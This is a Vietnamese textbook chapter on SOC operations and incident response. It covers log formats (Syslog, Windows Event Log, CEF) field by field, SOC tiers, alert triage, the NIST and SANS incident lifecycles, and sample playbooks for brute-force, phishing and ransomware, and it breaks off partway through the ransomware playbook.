# Chương 10 — Vận hành SOC & Ứng phó sự cố (IR)

## Nhập môn — hiểu nôm na trước khi đi sâu

Chương này nói về cách một tổ chức **theo dõi, phát hiện và xử lý các vụ tấn công mạng** — giống như một đội bảo vệ canh gác toà nhà và biết phải làm gì khi có trộm. Trong an toàn thông tin, đây là phần "thực chiến": không chỉ dựng tường rào (firewall, mật khẩu) mà còn phải có người ngồi xem camera, nghe chuông báo động, và chạy ra xử lý khi có chuyện. Hiểu phần này giúp bạn thấy được bức tranh tổng thể: log sinh ra từ đâu, ai đọc nó, và khi có sự cố thì các bước cứu chữa diễn ra thế nào. Trước khi lao vào các bảng mã hex và cú pháp rule ở phía dưới, hãy đi qua các "nhân vật chính" của chương bằng ngôn ngữ đời thường.

### SOC (Security Operations Center) — nói đơn giản

**SOC là gì?** Hãy tưởng tượng một **phòng trực camera an ninh của cả toà nhà**, hoạt động 24/7, gồm con người + quy trình + phần mềm. Nhiệm vụ của họ là nhìn vào hàng triệu "sự kiện" xảy ra mỗi ngày trên hệ thống máy tính và tìm ra cái nào là dấu hiệu kẻ trộm thật.

**Vì sao cần?** Mỗi ngày hệ thống sinh ra hàng tỷ dòng ghi chép (log), nhưng chỉ một phần cực nhỏ là tấn công thật. SOC tồn tại để **lọc tín hiệu thật ra khỏi nhiễu** một cách có tổ chức, lặp lại được, thay vì để mọi thứ trôi qua không ai để ý.

### Log và định dạng log — nói đơn giản

**Log là gì?** Log là **nhật ký** mà mỗi máy tính, thiết bị mạng tự ghi lại: "lúc 8h21 có người tên admin đăng nhập thất bại từ địa chỉ X". Giống như sổ ghi ra-vào của bảo vệ toà nhà.

**Định dạng log (Syslog, Windows Event, CEF) là gì và vì sao cần?** Mỗi loại thiết bị viết nhật ký theo "kiểu chữ" riêng — Linux dùng Syslog, Windows dùng Event Log, thiết bị bảo mật hay dùng CEF. Nếu không thống nhất cách đọc thì giống như nhận thư viết bằng nhiều thứ tiếng mà không ai dịch. Phải hiểu từng ô (field) trong log thì mới biết chuyện gì thực sự xảy ra — đây là kỹ năng nền tảng nhất của người làm SOC.

### Phân tầng SOC (Tier 1/2/3) — nói đơn giản

**Là gì?** SOC chia người làm thành 3 cấp theo độ khó của việc, không phải theo chức vụ. **Tier 1** là tuyến đầu nhận chuông báo và lọc nhanh thật/giả; **Tier 2** điều tra sâu khi việc khó; **Tier 3** là chuyên gia săn lùng kẻ tấn công tinh vi và mổ xẻ mã độc.

**Vì sao cần?** Báo động đến rất nhiều nhưng đa số đơn giản hoặc báo nhầm. Để chuyên gia giỏi (và đắt tiền) đi xử lý việc vặt là lãng phí và gây kiệt sức. Chia tầng giúp việc dễ xử lý nhanh-rẻ, việc khó dồn cho người đủ trình.

### Triage alert — nói đơn giản

**Là gì?** "Triage" mượn từ y khoa — khi phòng cấp cứu đông bệnh nhân, y tá phải **phân loại ai nguy kịch trước**. Trong SOC, triage là quy trình xem một cảnh báo: nó thật hay giả, thuộc loại gì, nguy hiểm mức nào, tự xử được hay phải chuyển lên trên.

**Vì sao cần?** Không thể đối xử mọi cảnh báo như nhau. Triage tốt giúp việc quan trọng được xử lý trước và không bỏ sót thứ nguy hiểm núp dưới vẻ "bình thường".

### Vòng đời ứng phó sự cố (NIST & SANS PICERL) — nói đơn giản

**Là gì?** Đây là **kịch bản chữa cháy chuẩn** cho khi có sự cố an ninh. Hai bộ khung nổi tiếng: NIST chia 4 pha (Chuẩn bị → Phát hiện & Phân tích → Cô lập, Loại bỏ & Phục hồi → Rút kinh nghiệm), còn SANS chia 6 bước dễ nhớ qua chữ **PICERL**. Về bản chất hai cái như nhau.

**Vì sao cần?** Khi sự cố xảy ra, người ta dễ hoảng và làm lung tung (ví dụ tắt máy ngay, vô tình xoá luôn bằng chứng). Có quy trình chuẩn giúp đội xử lý làm đúng thứ tự: chặn lan trước, giữ bằng chứng, rồi mới dọn sạch và khôi phục.

### Playbook / Runbook — nói đơn giản

**Là gì?** **Playbook** là kịch bản tổng quát cho một loại sự cố (ai làm gì, quyết định ra sao), còn **Runbook** là các bước thao tác chi tiết (gõ lệnh nào, chạy truy vấn gì). Giống như "quy trình thoát hiểm khi cháy" dán trên tường, có sẵn từng bước.

**Vì sao cần?** Lúc khẩn cấp không phải lúc để ngồi nghĩ. Có sẵn kịch bản giúp xử lý nhanh, nhất quán, không bỏ sót bước, kể cả khi người trực còn non kinh nghiệm.

### MTTD và MTTR — nói đơn giản

**Là gì?** Đây là hai cây thước đo. **MTTD** (Mean Time To Detect) = trung bình mất bao lâu để *phát hiện* ra sự cố kể từ lúc nó bắt đầu. **MTTR** (Mean Time To Respond/Recover) = trung bình mất bao lâu để *xử lý xong* kể từ lúc phát hiện.

**Vì sao cần?** "Cái gì đo được thì cải thiện được." Hai con số này cho biết đội phòng thủ nhanh hay chậm, và nỗ lực cải tiến có hiệu quả không. Kẻ tấn công ở trong mạng càng lâu thì thiệt hại càng lớn, nên rút ngắn hai con số này rất quan trọng.

### Các công cụ thực hành (Sigma, Suricata, YARA, Splunk, osquery, SOAR) — nói đơn giản

- **Sigma**: cách viết một "luật phát hiện" bằng văn bản chung, rồi dịch tự động sang ngôn ngữ truy vấn của từng phần mềm SIEM. Giống viết một công thức một lần, dùng được cho nhiều bếp khác nhau.
- **SIEM**: phần mềm gom toàn bộ log về một chỗ, đánh chỉ mục để tìm kiếm nhanh và tự bật chuông báo theo luật. Là "đầu não" nơi analyst ngồi làm việc.
- **Suricata**: lính gác đứng ngay đường mạng, soi từng gói tin đi qua và báo động (hoặc chặn) khi thấy dấu hiệu xấu — gọi là IDS/IPS.
- **YARA**: công cụ nhận diện mã độc bằng cách dò "vân tay" (các chuỗi ký tự, mẫu byte đặc trưng) trong file.
- **Splunk (SPL)**: một SIEM phổ biến; SPL là ngôn ngữ để hỏi dữ liệu log, kiểu như "cho tôi xem mọi lần đăng nhập thất bại từ IP này".
- **osquery / Velociraptor**: cho phép hỏi trạng thái một máy tính bằng câu lệnh giống SQL ("máy này đang mở những cổng nào?"), phục vụ săn lùng dấu vết.
- **TheHive / SOAR**: nền tảng quản lý hồ sơ sự cố và **tự động hoá** các bước xử lý lặp đi lặp lại (tra cứu, chặn, gửi thông báo), để con người tập trung vào phần khó.

**Vì sao cần?** Một mình con người không thể đọc hết hàng tỷ log hay soi từng gói tin. Các công cụ này là "giác quan" và "cánh tay" giúp phát hiện và phản ứng ở quy mô lớn.

### Threat Hunting & MITRE ATT&CK — nói đơn giản

**Là gì?** **Threat hunting** là chủ động đi *săn* kẻ tấn công còn lẩn trốn mà chuông báo tự động chưa kêu — thay vì ngồi chờ báo động. Người săn đặt ra một **giả thuyết** ("biết đâu kẻ địch đang di chuyển ngang trong mạng") rồi đi tìm bằng chứng. **MITRE ATT&CK** là một bộ "từ điển" liệt kê có hệ thống các chiêu trò (kỹ thuật) mà kẻ tấn công hay dùng, mỗi chiêu có một mã Txxxx.

**Vì sao cần?** Kẻ tấn công giỏi biết cách né các luật phát hiện sẵn có. Săn chủ động dựa trên hiểu biết về chiêu trò của chúng giúp tìm ra thứ mà hệ thống tự động bỏ sót.

### Chain of Custody & Forensic — nói đơn giản

**Là gì?** **Forensic** (điều tra số) là thu thập và phân tích bằng chứng số sau sự cố. **Chain of custody** (chuỗi lưu giữ bằng chứng) là cuốn sổ ghi rõ *ai* giữ bằng chứng, *khi nào*, *làm gì* với nó — y như niêm phong vật chứng trong phim hình sự.

**Vì sao cần?** Nếu bằng chứng có thể bị sửa hay không rõ nguồn gốc thì vô giá trị trước toà. Ngoài ra có nguyên tắc quan trọng: RAM (bộ nhớ tạm) mất hết khi tắt máy, nên phải thu thập thứ dễ bay hơi trước — đây là lý do nhiều kịch bản dặn "đừng tắt máy, chỉ ngắt mạng".

### Log Retention — nói đơn giản

**Là gì?** Là chính sách **giữ log trong bao lâu** và lưu thế nào. Thường chia tầng nóng/ấm/lạnh: log mới giữ ở nơi truy cập nhanh nhưng đắt, log cũ nén lại lưu nơi rẻ.

**Vì sao cần?** Kẻ tấn công có thể đã ẩn trong mạng hàng tháng trước khi bị lộ. Nếu chỉ giữ log 30 ngày thì lúc điều tra sẽ không còn dấu vết ngày chúng đột nhập. Ngoài ra nhiều quy định pháp lý bắt buộc phải lưu log một thời gian tối thiểu.

Nắm được mấy ý trên rồi thì phần dưới đây sẽ đi sâu vào chi tiết kỹ thuật.

> Chương này là tài liệu tham chiếu để tự học và tra cứu. Mỗi khái niệm trình bày theo trục: **LÀ GÌ → CƠ CHẾ BÊN TRONG (tới mức bit/byte/bước/tham số) → VÍ DỤ THỰC TẾ (lệnh, cấu hình, rule, output) → LƯU Ý BẢO MẬT**. Các con số được ghi rõ nguồn; chỗ nào cần kiểm chứng sẽ ghi "[cần kiểm chứng]".

---

## 10.1. Tổng quan kiến trúc SOC và luồng dữ liệu

### 10.1.1. SOC là gì và vì sao tồn tại

**SOC (Security Operations Center)** là đơn vị (con người + quy trình + công nghệ) chịu trách nhiệm giám sát liên tục (thường 24/7), phát hiện, phân tích và ứng phó với các sự kiện an ninh trên toàn bộ hạ tầng số của tổ chức. Lý do tồn tại: phòng thủ là một bài toán **phát hiện sớm trong biển dữ liệu nhiễu**. Một doanh nghiệp cỡ trung bình có thể sinh ra hàng tỷ event log mỗi ngày; chỉ một phần rất nhỏ trong đó là dấu hiệu tấn công thật. SOC là cơ chế tổ chức để lọc tín hiệu (signal) ra khỏi nhiễu (noise) một cách có hệ thống, lặp lại được, và đo lường được.

### 10.1.2. Luồng dữ liệu end-to-end trong SOC

Để hiểu mọi thứ phía sau, cần nắm chính xác dữ liệu đi qua đâu, biến đổi thế nào:

```
[Nguồn log]            [Vận chuyển]          [Chuẩn hoá/Lưu trữ]      [Phát hiện]        [Con người]
 Endpoint (EDR) ──┐
 Firewall/IDS  ───┤   syslog/UDP 514
 Web server    ───┼──> TCP 6514 (TLS) ──> Collector ──> Parser/Normalize ──> SIEM ──> Alert ──> Analyst
 Cloud (CT logs)──┤   Beats/Agent             (Logstash,    (ECS, CIM)       (rule,    (Tier 1/2/3)
 AD/Auth       ───┘   Kafka                    Vector)                        ML, corr)
```

**Giải thích từng chặng:**

| Chặng | Vai trò | Định dạng dữ liệu điển hình |
|---|---|---|
| Nguồn log | Sinh sự kiện thô | Windows Event (EVTX/XML), Syslog (RFC 5424), JSON, CEF, LEEF |
| Vận chuyển | Đưa log từ nguồn về tập trung | Syslog over UDP/TCP/TLS, Filebeat/Fluentd, Kafka topic |
| Chuẩn hoá | Đưa về schema chung để truy vấn | ECS (Elastic Common Schema), Splunk CIM, OCSF |
| SIEM | Lưu, đánh chỉ mục, chạy rule tương quan | Inverted index, time-series store |
| Phát hiện | Sinh alert từ rule/ML/correlation | Sigma rule, EQL, SPL, KQL |
| Con người | Triage, điều tra, ứng phó | Ticket, playbook, case |

**VÌ SAO thiết kế phân tầng như vậy:** tách rời nguồn — vận chuyển — lưu trữ — phát hiện cho phép thay thế từng thành phần độc lập (đổi SIEM mà không phải cấu hình lại mọi endpoint), chịu tải bằng buffer (Kafka hấp thụ burst), và áp dụng bảo mật riêng cho từng chặng (mã hoá đường truyền, kiểm soát truy cập kho log).

---

## 10.2. Định dạng log ở mức byte/field — nền tảng phải nắm

Phân tích SOC bắt đầu từ việc đọc đúng từng trường log. Dưới đây là các định dạng cốt lõi mổ xẻ tới mức trường.

### 10.2.1. Syslog RFC 5424 — mổ xẻ từng trường

RFC 5424 (2009) định nghĩa định dạng syslog hiện đại, thay cho RFC 3164 (BSD syslog cũ). Một message syslog RFC 5424 có cấu trúc:

```
<PRI>VERSION SP TIMESTAMP SP HOSTNAME SP APP-NAME SP PROCID SP MSGID SP STRUCTURED-DATA SP MSG
```

Ví dụ thực tế một dòng:

```
<34>1 2026-06-19T08:21:09.003Z auth-srv-01 sshd 4821 ID47 [exampleSDID@32473 iut="3"] Failed password for invalid user admin from 203.0.113.45 port 51022 ssh2
```

Bảng mổ xẻ từng trường:

| Trường | Kích thước | Ý nghĩa | Ví dụ |
|---|---|---|---|
| PRI | 3–5 ký tự, gồm `<` `>` | Priority = Facility×8 + Severity | `<34>` |
| VERSION | 1–2 ký tự (số) | Phiên bản format, luôn `1` cho RFC 5424 | `1` |
| TIMESTAMP | tối đa 32 ký tự, RFC 3339 | Thời điểm sinh sự kiện, có múi giờ | `2026-06-19T08:21:09.003Z` |
| HOSTNAME | ≤ 255 ký tự | Tên/IP máy sinh log | `auth-srv-01` |
| APP-NAME | ≤ 48 ký tự | Tên ứng dụng | `sshd` |
| PROCID | ≤ 128 ký tự | PID hoặc id tiến trình | `4821` |
| MSGID | ≤ 32 ký tự | Loại message | `ID47` |
| STRUCTURED-DATA | thay đổi | Cặp key=value có cấu trúc, `[SDID param="val"]` hoặc `-` nếu rỗng | `[exampleSDID@32473 iut="3"]` |
| MSG | còn lại | Nội dung tự do (UTF-8, có thể bắt đầu bằng BOM EF BB BF) | `Failed password ...` |

**Giải mã trường PRI `<34>`** — đây là chỗ hay bị hiểu sai:

PRI là một số nguyên = `Facility * 8 + Severity`.

```
34 / 8 = 4  (phần nguyên) -> Facility = 4  (security/authorization messages)
34 % 8 = 2                -> Severity = 2  (Critical)
```

Bảng Severity (RFC 5424 §6.2.1):

| Giá trị | Tên | Ý nghĩa |
|---|---|---|
| 0 | Emergency | Hệ thống không dùng được |
| 1 | Alert | Phải hành động ngay |
| 2 | Critical | Tình trạng nguy kịch |
| 3 | Error | Lỗi |
| 4 | Warning | Cảnh báo |
| 5 | Notice | Bình thường nhưng đáng chú ý |
| 6 | Informational | Thông tin |
| 7 | Debug | Gỡ lỗi |

Bảng Facility (một số giá trị quan trọng): 0=kernel, 1=user, 2=mail, 3=daemon, 4=auth/security, 10=authpriv, 16–23=local0–local7.

**VÌ SAO ghép Facility và Severity vào 1 byte:** thiết kế từ thời băng thông hẹp, gói tin nhỏ; một số nguyên duy nhất cho phép router/collector lọc nhanh (ví dụ "chỉ chuyển tiếp message severity ≤ 3") mà không cần parse toàn bộ.

**Lưu ý bảo mật:** UDP 514 không có xác thực, không mã hoá, không đảm bảo thứ tự/đến nơi. Kẻ tấn công có thể **spoof** log (giả mạo nguồn) để gây nhiễu hoặc xoá dấu vết bằng cách bơm log giả. Production phải dùng **syslog over TLS (RFC 5425, TCP 6514)** với chứng chỉ hai chiều.

### 10.2.2. Windows Event Log (EVTX) và các trường an ninh quan trọng

Windows ghi event dưới dạng nhị phân EVTX nhưng truy vấn ở dạng XML. Mỗi event có cấu trúc:

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-...}"/>
    <EventID>4625</EventID>
    <Version>0</Version>
    <Level>0</Level>
    <Task>12544</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8010000000000000</Keywords>
    <TimeCreated SystemTime="2026-06-19T08:21:09.003Z"/>
    <EventRecordID>184756</EventRecordID>
    <Channel>Security</Channel>
    <Computer>WIN-DC01</Computer>
    <Security/>
  </System>
  <EventData>
    <Data Name="TargetUserName">admin</Data>
    <Data Name="IpAddress">203.0.113.45</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="Status">0xC000006D</Data>
    <Data Name="SubStatus">0xC0000064</Data>
  </EventData>
</Event>
```

Bảng các Event ID an ninh phải thuộc lòng:

| Event ID | Ý nghĩa | Dùng để phát hiện |
|---|---|---|
| 4624 | Logon thành công | Theo dõi truy cập, baseline |
| 4625 | Logon thất bại | Brute-force, password spray |
| 4634 / 4647 | Logoff | Tương quan phiên |
| 4672 | Gán quyền đặc biệt cho logon | Phát hiện admin/privilege |
| 4688 | Tạo tiến trình mới (có cmdline nếu bật) | Phát hiện thực thi độc hại |
| 4768 / 4769 | Kerberos TGT / Service ticket | Kerberoasting, Golden Ticket |
| 4719 | Thay đổi chính sách audit | Kẻ tấn công tắt audit |
| 1102 | Xoá Security log | Anti-forensics |
| 7045 | Cài đặt service mới | Persistence |

**Trường `LogonType` (Event 4624/4625)** — rất quan trọng để phân biệt loại truy cập:

| LogonType | Ý nghĩa |
|---|---|
| 2 | Interactive (đăng nhập tại máy) |
| 3 | Network (truy cập file share, RDP qua NLA) |
| 4 | Batch (scheduled task) |
| 5 | Service |
| 7 | Unlock (mở khoá màn hình) |
| 8 | NetworkCleartext (mật khẩu truyền cleartext — đáng ngờ) |
| 9 | NewCredentials (runas /netonly) |
| 10 | RemoteInteractive (RDP) |
| 11 | CachedInteractive (dùng credential cache) |

**Trường `Status`/`SubStatus` (Event 4625)** — mã lỗi NTSTATUS cho biết VÌ SAO logon thất bại:

| Mã | Ý nghĩa |
|---|---|
| 0xC0000064 | User không tồn tại |
| 0xC000006A | Sai mật khẩu |
| 0xC0000234 | Tài khoản bị khoá (locked out) |
| 0xC0000072 | Tài khoản bị disable |
| 0xC000006F | Đăng nhập ngoài giờ cho phép |
| 0xC0000071 | Mật khẩu hết hạn |

**Phân biệt then chốt:** nhiều 4625 với SubStatus `0xC0000064` (user không tồn tại) đan xen → dấu hiệu **password spray / user enumeration**; nhiều `0xC000006A` cho **cùng một user** → **brute-force** đúng tài khoản đó.

### 10.2.3. CEF (Common Event Format) — định dạng SIEM phổ biến

CEF do ArcSight định nghĩa, header phân tách bằng dấu `|`:

```
CEF:Version|Device Vendor|Device Product|Device Version|Signature ID|Name|Severity|Extension
```

Ví dụ:

```
CEF:0|Security|Firewall|2.1|100|Blocked connection|7|src=203.0.113.45 dst=10.0.0.5 spt=51022 dpt=22 proto=TCP act=blocked
```

| Trường | Ý nghĩa | Ví dụ |
|---|---|---|
| Version | Phiên bản CEF | `0` |
| Device Vendor | Hãng | `Security` |
| Device Product | Sản phẩm | `Firewall` |
| Device Version | Phiên bản sản phẩm | `2.1` |
| Signature ID | Mã loại sự kiện | `100` |
| Name | Mô tả | `Blocked connection` |
| Severity | 0–10 | `7` |
| Extension | Cặp key=value (CEF dictionary) | `src=... dst=... spt=...` |

Các khoá Extension chuẩn: `src` (source IP), `dst` (dest IP), `spt` (source port), `dpt` (dest port), `suser` (source user), `act` (action), `proto`. Chuẩn hoá khoá là lý do CEF được SIEM hỗ trợ rộng — parser biết trước ý nghĩa từng khoá.

---

## 10.3. Cấu trúc SOC theo tier — nhiệm vụ chính xác từng cấp

SOC tổ chức theo mô hình **tiered** để phân bổ độ phức tạp công việc và chi phí nhân sự hợp lý. Đây không phải phân cấp địa vị mà là phân công theo độ sâu điều tra.

### 10.3.1. Tier 1 — Triage Analyst (Alert Handler)

**Nhiệm vụ:**
- Là tuyến đầu nhận alert từ SIEM.
- Thực hiện **triage** ban đầu: xác minh nhanh alert là true positive (TP) hay false positive (FP).
- Phân loại theo loại (malware, phishing, brute-force...) và mức ưu tiên.
- Đóng FP có căn cứ; **escalate** lên Tier 2 nếu vượt khả năng/độ phức tạp.
- KPI: thời gian phản hồi alert, tỷ lệ alert xử lý đúng SLA.

**Giới hạn:** Tier 1 làm việc theo **playbook/runbook** đã định nghĩa; không tự do điều tra sâu hệ thống. Mục tiêu là throughput và độ nhất quán.

### 10.3.2. Tier 2 — Incident Responder / Investigator

**Nhiệm vụ:**
- Nhận case escalate từ Tier 1.
- Điều tra sâu: phân tích log đa nguồn, dựng timeline, xác định phạm vi (scope) và root cause.
- Thực hiện containment ban đầu, phối hợp eradication/recovery.
- Phân tích forensic mức trung bình (memory, disk artifact cơ bản).
- Viết và tinh chỉnh detection rule để giảm FP cho Tier 1.

### 10.3.3. Tier 3 — Threat Hunter / Forensic & Malware Expert

**Nhiệm vụ:**
- **Threat hunting** chủ động (proactive): đặt giả thuyết và đi tìm dấu vết kẻ tấn công CHƯA bị alert phát hiện.
- Forensic chuyên sâu (memory forensics, reverse malware).
- Xử lý sự cố lớn (major incident), APT.
- Phát triển detection mới, threat intelligence, tham gia purple team.

### 10.3.4. So sánh tier

| Tiêu chí | Tier 1 | Tier 2 | Tier 3 |
|---|---|---|---|
| Đầu vào | Alert thô | Case escalate | Giả thuyết / major incident |
| Hoạt động chính | Triage, phân loại | Điều tra, containment | Hunting, forensic sâu, RE malware |
| Mức tự do | Theo playbook | Điều tra có hướng dẫn | Tự định hướng |
| Công cụ điển hình | SIEM console, SOAR | SIEM query, EDR, sandbox | Volatility, IDA/Ghidra, YARA, threat intel |
| Kết quả đầu ra | Ticket TP/FP, escalation | Báo cáo điều tra, IOC | Detection mới, IOC/TTP, RCA |

**VÌ SAO phân tier:** alert đến với khối lượng lớn nhưng phần lớn đơn giản hoặc FP. Để chuyên gia đắt tiền (Tier 3) đi xử lý FP là lãng phí và gây burnout. Tier hoá đảm bảo công việc đơn giản được xử lý nhanh & rẻ, công việc khó được dồn cho người đủ năng lực.

---

## 10.4. Quy trình triage alert — từng bước

Triage là kỹ năng cốt lõi của vận hành SOC. Quy trình chuẩn gồm 5 bước.

### Bước 1 — Xác minh (Validation)
Trả lời: alert này có thật không? Đọc raw event đứng sau alert (không tin tóm tắt của SIEM), kiểm tra:
- Nguồn log có đáng tin? (asset thật hay honeypot/test?)
- Có khớp baseline không? (IP nội bộ đã biết? user hợp lệ?)
- Có phải hoạt động được lên lịch/được phê duyệt? (scan định kỳ, pentest?)

### Bước 2 — Phân loại (Categorization)
Gán loại sự cố theo taxonomy của tổ chức (thường ánh xạ tới NIST/VERIS hoặc MITRE ATT&CK tactic): ví dụ `Credential Access`, `Malware`, `Phishing`, `Recon`.

### Bước 3 — Ưu tiên (Prioritization)
Tính mức ưu tiên = hàm của **mức nghiêm trọng (severity)** × **độ tin cậy (confidence/fidelity)** × **giá trị tài sản (asset criticality)**. Một công thức ưu tiên thường dùng:

```
Priority = Severity (Impact) × Likelihood
```

Ánh xạ ví dụ thành ma trận P1–P4:

| Impact \ Likelihood | Cao | Trung bình | Thấp |
|---|---|---|---|
| Cao (server sản xuất/DC) | P1 | P1 | P2 |
| Trung bình | P2 | P2 | P3 |
| Thấp (máy test) | P3 | P3 | P4 |

### Bước 4 — Escalate hoặc xử lý
- Nếu trong phạm vi playbook → xử lý theo playbook.
- Nếu vượt phạm vi/nghi major incident → escalate Tier 2 kèm **đầy đủ ngữ cảnh** (raw log, IOC, các bước đã làm). Escalation thiếu ngữ cảnh là nguyên nhân số 1 làm chậm điều tra.

### Bước 5 — Đóng (Closure)
- FP: ghi rõ **lý do** và **bằng chứng**; đề xuất tinh chỉnh rule (tuning) để alert đó không lặp lại.
- TP đã xử lý: ghi hành động đã thực hiện, IOC, bài học.

**Lưu ý bảo mật:** Đóng FP cẩu thả (không đọc raw log, "trông quen quen") là lỗ hổng vận hành nghiêm trọng — kẻ tấn công cố tình tạo ra hoạt động "trông giống bình thường". Mọi closure phải có bằng chứng truy vết được.

---

## 10.5. Vòng đời ứng phó sự cố — NIST SP 800-61 và SANS PICERL

### 10.5.1. NIST SP 800-61 — 4 pha

NIST SP 800-61 Rev. 2 (Computer Security Incident Handling Guide) định nghĩa vòng đời 4 pha. Lưu ý vòng đời là **chu trình lặp** (không tuyến tính) — Detection & Analysis và Containment/Eradication/Recovery có thể quay vòng nhiều lần.

```
        ┌─────────────────────────────────────────────┐
        │                                             │
        ▼                                             │
  ┌───────────┐    ┌───────────────────┐    ┌──────────────────────────┐    ┌──────────────────┐
  │1.Preparation│──>│2.Detection &      │──>│3.Containment, Eradication │──>│4.Post-Incident   │
  │           │    │  Analysis          │   │  & Recovery               │   │  Activity        │
  └───────────┘    └───────────────────┘    └──────────────────────────┘   │  (Lessons Learned)│
        ▲                  │  ▲                       │  ▲                  └────────┬─────────┘
        │                  └──┘  (lặp phân tích)      └──┘ (lặp xử lý)               │
        └──────────────────────────────────────────────────────────────────────────┘
```

#### Pha 1 — Preparation (Chuẩn bị)
**Đầu vào:** chính sách, ngân sách, công cụ. **Đầu ra:** năng lực sẵn sàng ứng phó.
Hoạt động: xây IR plan & playbook; trang bị jump kit (laptop forensic, write-blocker, ổ cứng sạch, cáp); thiết lập kênh liên lạc out-of-band (phòng khi hệ thống chính bị xâm nhập); huấn luyện; tập trận (tabletop exercise); đảm bảo logging/visibility đầy đủ. **Đây là pha quan trọng nhất** — không chuẩn bị thì các pha sau hỗn loạn.

#### Pha 2 — Detection & Analysis (Phát hiện & Phân tích)
**Đầu vào:** alert, log, báo cáo. **Đầu ra:** xác nhận sự cố, phạm vi, mức độ.
Hoạt động: xác định precursor (dấu hiệu sắp xảy ra) và indicator (dấu hiệu đang/đã xảy ra); phân tích, tương quan; xác định scope; **document** mọi phát hiện; **prioritize** (impact functional/information/recoverability); **notify** các bên liên quan.

#### Pha 3 — Containment, Eradication & Recovery
- **Containment (Cô lập):** ngăn lan rộng. Chia 2 mức:
  - *Short-term (ngắn hạn):* hành động nhanh, có thể tạm thời — ngắt mạng máy nhiễm, block IP C2 tại firewall. Mục tiêu: dừng thiệt hại NGAY mà không phá bằng chứng.
  - *Long-term (dài hạn):* giải pháp ổn định hơn trong khi chuẩn bị eradication — vá tạm, đặt host vào VLAN cách ly, áp ACL.
- **Eradication (Loại bỏ):** xoá tận gốc nguyên nhân — gỡ malware, xoá tài khoản kẻ tấn công tạo, đóng lỗ hổng bị khai thác, reset credential bị lộ.
- **Recovery (Phục hồi):** đưa hệ thống về sản xuất an toàn — khôi phục từ backup sạch, rebuild máy, giám sát tăng cường để chắc kẻ tấn công không quay lại.

#### Pha 4 — Post-Incident Activity (Lessons Learned)
**Đầu vào:** toàn bộ hồ sơ sự cố. **Đầu ra:** cải tiến.
Hoạt động: họp "lessons learned" trong vòng vài ngày sau khi đóng; trả lời: Chuyện gì xảy ra & khi nào? Đội xử lý tốt/dở chỗ nào? Lẽ ra cần thông tin gì sớm hơn? Bước nào lẽ ra làm khác? Cần thêm công cụ/quy trình gì? Cập nhật playbook, detection, đào tạo.

### 10.5.2. SANS PICERL — 6 bước

SANS dùng mô hình 6 bước, dễ nhớ qua chữ **PICERL**:

| Bước | Tên | Tương ứng NIST |
|---|---|---|
| P | Preparation | Preparation |
| I | Identification | Detection & Analysis |
| C | Containment | Containment |
| E | Eradication | Eradication |
| R | Recovery | Recovery |
| L | Lessons Learned | Post-Incident Activity |

**Khác biệt với NIST:** SANS tách Containment/Eradication/Recovery thành 3 bước riêng (rõ ràng hơn về thao tác), trong khi NIST gộp thành 1 pha (nhấn mạnh tính lặp). Về bản chất hai mô hình tương đương.

### 10.5.3. Containment vs Eradication — phân biệt cốt lõi

| Tiêu chí | Containment | Eradication |
|---|---|---|
| Mục tiêu | Ngăn lan rộng, dừng thiệt hại ngay | Loại bỏ tận gốc nguyên nhân |
| Tính chất | Tạm thời, có thể đảo ngược | Vĩnh viễn |
| Ví dụ | Ngắt mạng host nhiễm | Format & rebuild host, xoá backdoor |
| Bằng chứng | Phải BẢO TOÀN (chưa xoá) | Sau khi đã thu thập forensic |
| Sai lầm thường gặp | Tắt máy ngay → mất RAM (volatile) | Xoá malware nhưng bỏ sót persistence |

**Quy tắc vàng:** Containment trước, thu thập bằng chứng (forensic), rồi mới Eradication. Eradication mà bỏ sót một backdoor/scheduled task → kẻ tấn công quay lại trong Recovery.

---

## 10.6. Playbook / Runbook mẫu

**Playbook** = quy trình cấp cao (các giai đoạn, ai làm, quyết định gì). **Runbook** = các bước thao tác cụ thể (lệnh, query) để thực hiện một phần playbook. Dưới đây là 3 playbook then chốt.

### 10.6.1. Playbook — Brute-force / Password Spray (SSH/RDP)

```
TRIGGER: > 20 lần 4625 (hoặc sshd Failed password) cùng src trong 5 phút,
         HOẶC 1 src thử > 10 username khác nhau (spray)

1. IDENTIFY
   - Truy vấn toàn bộ login fail từ src IP, khung 24h.
   - Xác định: có 4624 (success) nào SAU chuỗi fail không? -> nếu CÓ: nâng severity (đã vào được)
   - Lấy: src IP, username target, LogonType, geo/ASN của IP.

2. CONTAIN (short-term)
   - Nếu chưa success: block src IP tại firewall/WAF.
   - Nếu IP nội bộ: cô lập host nguồn (có thể bị compromise dùng làm bàn đạp).

3. CONTAIN (nếu đã success - Bước 1 phát hiện 4624)
   - Disable tài khoản bị truy cập thành công.
   - Force reset password; kill phiên đang hoạt động.
   - Chuyển sang playbook "Compromised Account".

4. ERADICATE
   - Rà soát persistence trên host nếu IP nội bộ.
   - Kiểm tra tài khoản lạ mới tạo (Event 4720), thay đổi nhóm (4728/4732).

5. RECOVER
   - Bỏ block sau khi xác nhận an toàn / hoặc giữ block IOC.
   - Bật MFA, áp rate-limit / fail2ban.

6. LESSONS
   - Vì sao tài khoản dùng mật khẩu yếu? Có MFA chưa? Tinh chỉnh threshold alert.
```

### 10.6.2. Playbook — Phishing

```
TRIGGER: User report email nghi ngờ / EDR cảnh báo attachment.

1. IDENTIFY
   - Thu thập email gốc (.eml/.msg) - KHÔNG forward (mất header). Dùng "save as".
   - Phân tích header: Return-Path, Received chain, SPF/DKIM/DMARC kết quả (Authentication-Results).
   - Trích IOC: sender, reply-to, URL, hash attachment, domain.
   - Detonate attachment/URL trong sandbox.
   - Truy vấn: bao nhiêu user khác NHẬN email này? Bao nhiêu đã CLICK/mở?

2. CONTAIN
   - Quarantine/purge email khỏi mọi mailbox (vd Microsoft 365 Search & Purge).
   - Block sender domain, URL tại mail gateway/proxy/DNS sinkhole.
   - Reset credential nếu là credential-harvesting và user đã nhập.

3. ERADICATE
   - Gỡ payload trên endpoint đã thực thi (EDR).
   - Kiểm tra mailbox rule độc hại (forwarding rule kẻ tấn công tạo).

4. RECOVER / LESSONS
   - Thông báo user; awareness training; thêm IOC vào blocklist.
```

### 10.6.3. Playbook — Ransomware

```
TRIGGER: Cảnh báo mass file rename/encrypt, ransom note, EDR detect.

1. CONTAIN (ƯU TIÊN TỐI CAO - tốc độ quyết định)
   - CÔ LẬP host nhiễm khỏi mạng NGAY (ngắt cable/disable switchport/EDR network-isolate).
